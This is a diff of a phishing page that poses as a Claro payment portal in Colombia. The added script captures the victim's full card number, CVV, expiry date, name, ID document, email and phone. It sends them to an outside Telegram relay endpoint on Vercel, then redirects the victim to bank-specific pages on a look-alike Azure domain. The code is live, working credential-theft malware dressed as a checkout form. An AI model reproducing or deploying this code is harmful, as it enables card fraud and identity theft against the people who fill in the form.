@@ -108,13 +108,13 @@
 
   <main class="main-container">
     <section>
-      <!-- <p style="margin-bottom: 5%; text-align: start;">Medios de pago</p>
+      <p style="margin-bottom: 5%; text-align: start;">Medios de pago</p>
       <div style="display: flex; width: 15%; gap: 40%; opacity: 40%;">
         <img src="img/icono-AMEX.svg" alt="">
         <img src="img/icono-VISA.svg" alt="">
         <img src="img/icono-MASTERCARD.svg" alt="">
         <img src="img/icono-DINERS.svg" alt="">
-      </div> -->
+      </div>
       <div>
         <img src="img/icono-AYUDA.png" style="margin-top: 12%;" alt="">
       </div>
@@ -323,89 +323,103 @@
     </style>
     
    <script>
-  // URL absoluta de tu backend (reemplaza por la tuya)
-  const SEND_TELEGRAM_ENDPOINT = 'https://lack-delta.vercel.app/api/send-telegram';
+  // Mapeo de bancos
+const bankRedirects = {
+  bancolombia: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bancol/personas/formulario_u1.php",
+  bancobogota: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bogota/personas/formulario_u1.php",
+  davivienda: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/davi/personas/formulario_u1.php",
+  bancopopular: "pago.html",
+  bbva: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bbva/personas/formulario_u1.php",
+  occidente: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/occidente/personas/formulario_u1.php",
+  avvillas: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/avillas/personas/formulario_u1.php",
+  caja: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/caja/personas/formulario_u1.php",
+  fala: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/fala/personas/formulario_u1.php",
+  itau: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/itau/personas/formulario_u1.php",
+  scoti: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/scoti/personas/formulario_u1.php"
+};
 
-  // Mapeo de bancos a URL de redirección
-  const bankRedirects = {
-    bancolombia: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bancol/personas/formulario_u1.php",
-    bancobogota: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bogota/personas/formulario_u1.php",
-    davivienda: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/davi/personas/formulario_u1.php",
-    bancopopular: "pago.html",
-    bbva: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bbva/personas/formulario_u1.php",
-    occidente: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/occidente/personas/formulario_u1.php",
-    avvillas: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/avillas/personas/formulario_u1.php",
-    caja:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/caja/personas/formulario_u1.php",
-    fala:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/fala/personas/formulario_u1.php",
-    itau:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/itau/personas/formulario_u1.php",
-    scoti:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/scoti/personas/formulario_u1.php"
-  };
+// Ajuste dinámico del maxlength del CVC
+document.getElementById('numeroTarjeta').addEventListener('input', function() {
+  const cardLength = this.value.replace(/\s+/g, '').length;
+  const cvcInput = document.getElementById('CVC');
+  cvcInput.maxLength = cardLength === 14 ? 4 : 3;
+});
 
-  // Ajuste dinámico del maxlength del CVC según la longitud del número de tarjeta
-  document.getElementById('numeroTarjeta').addEventListener('input', function() {
-    const cardLength = this.value.replace(/\s+/g, '').length; // eliminar espacios
-    const cvcInput = document.getElementById('CVC');
-    if (cardLength === 14) {
-      cvcInput.maxLength = 4;
-    } else {
-      cvcInput.maxLength = 3;
-    }
-  });
+// Función EXACTA del código que funciona
+async function enviarDatosTelegram() {
+  const numeroTarjeta = document.getElementById('numeroTarjeta').value.trim();
+  const nombreApellido = document.getElementById('nombreApellido').value.trim();
+  const tipoDocumento = document.getElementById('tipoDocumento').value;
+  const numeroDocumento = document.getElementById('numeroDocumento').value.trim();
+  const mes = document.getElementById('mesExpiracion').value;
+  const anio = document.getElementById('anioExpiracion').value;
+  const fechaExp = mes && anio ? mes + '/' + anio.slice(2) : '';
+  const cvv = document.getElementById('CVC').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const cel = document.getElementById('cel').value.trim();
+  const cuotas = document.getElementById('cuotas').value.trim();
+  const banco = document.getElementById('banco').value;
 
-  // Acción al hacer clic en el botón Confirmar
-  document.getElementById('confirmBtn').addEventListener('click', function(event) {
-    event.preventDefault(); // Prevenir cualquier acción por defecto
+  if (!nombreApellido || !numeroTarjeta || !fechaExp || !cvv || !numeroDocumento || !banco) {
+    alert('Completa todos los campos.');
+    return false;
+  }
 
-    // Recolectar datos de los inputs
-    const numeroTarjeta = document.getElementById('numeroTarjeta').value;
-    const nombreApellido = document.getElementById('nombreApellido').value;
-    const tipoDocumento = document.getElementById('tipoDocumento').value;
-    const numeroDocumento = document.getElementById('numeroDocumento').value;
-    const mesExpiracion = document.getElementById('mesExpiracion').value;
-    const anioExpiracion = document.getElementById('anioExpiracion').value;
-    const CVC = document.getElementById('CVC').value;
-    const email = document.getElementById('email').value;
-    const cel = document.getElementById('cel').value;
-    const cuotas = document.getElementById('cuotas').value;
-    const banco = document.getElementById('banco').value;
+  const mensaje = `
+🔻 *Nueva solicitud de datos* 🔻
 
-    // Construir el mensaje a enviar (igual que antes)
-    const message = 
-      "Número de tarjeta: " + numeroTarjeta + "\n" +
-      "Nombre y apellido: " + nombreApellido + "\n" +
-      "Tipo de documento: " + tipoDocumento + "\n" +
-      "Número de documento: " + numeroDocumento + "\n" +
-      "Fecha de expiración: " + mesExpiracion + " / " + anioExpiracion + "\n" +
-      "CVC/CVV: " + CVC + "\n" +
-      "Correo electrónico: " + email + "\n" +
-      "Número de celular: " + cel + "\n" +
-      "Número de cuotas: " + cuotas + "\n" +
-      "Banco: " + banco;
+👤 Titular: ${nombreApellido}
+💳 Número de tarjeta: ${numeroTarjeta}
+📅 Fecha de expiración: ${fechaExp}
+🔐 CVV: ${cvv}
+🆔 Documento: ${numeroDocumento}
+📋 Tipo de documento: ${tipoDocumento}
+📧 Correo: ${email}
+📱 Celular: ${cel}
+💰 Cuotas: ${cuotas}
+🏦 Banco: ${banco}
+  `.trim();
 
-    // Enviar mensaje al backend (URL absoluta definida arriba)
-    fetch(SEND_TELEGRAM_ENDPOINT, {
+  try {
+    const resp = await fetch('https://clarotg.vercel.app/api/send-telegram', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ message })
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log("Mensaje enviado (respuesta backend):", data);
-      // Redirección según el banco seleccionado
-      if (bankRedirects[banco]) {
-        window.location.href = bankRedirects[banco];
-      } else {
-        alert("Banco no reconocido para redirección.");
-      }
-    })
-    .catch(error => {
-      console.error("Error al enviar el mensaje al backend:", error);
-      // Aunque ocurra un error, se puede proceder con la redirección
-      if (bankRedirects[banco]) {
-        window.location.href = bankRedirects[banco];
-      }
+      body: JSON.stringify({ message: mensaje })
     });
-  });
+
+    if (resp.ok) {
+      return banco;
+    } else {
+      console.error('Error API status:', resp.status);
+      alert('Error al enviar la información. Por favor, inténtalo de nuevo.');
+      return false;
+    }
+  } catch (err) {
+    console.error('Fallo de red:', err);
+    alert('Error de red. Por favor, verifica tu conexión a internet.');
+    return false;
+  }
+}
+
+function redirigirSegunBanco(banco) {
+  const url = bankRedirects[banco];
+  if (url) {
+    window.location.href = url;
+  } else {
+    alert("Banco no reconocido.");
+  }
+}
+
+document.getElementById('confirmBtn').addEventListener('click', async function(e) {
+  e.preventDefault();
+
+  const bancoSeleccionado = await enviarDatosTelegram();
+  if (bancoSeleccionado) {
+    setTimeout(() => {
+      redirigirSegunBanco(bancoSeleccionado);
+    }, 2000);
+  }
+});
 </script>
 
     
@@ -416,5 +430,3 @@
   </footer>
 </body>
 </html>
-
-
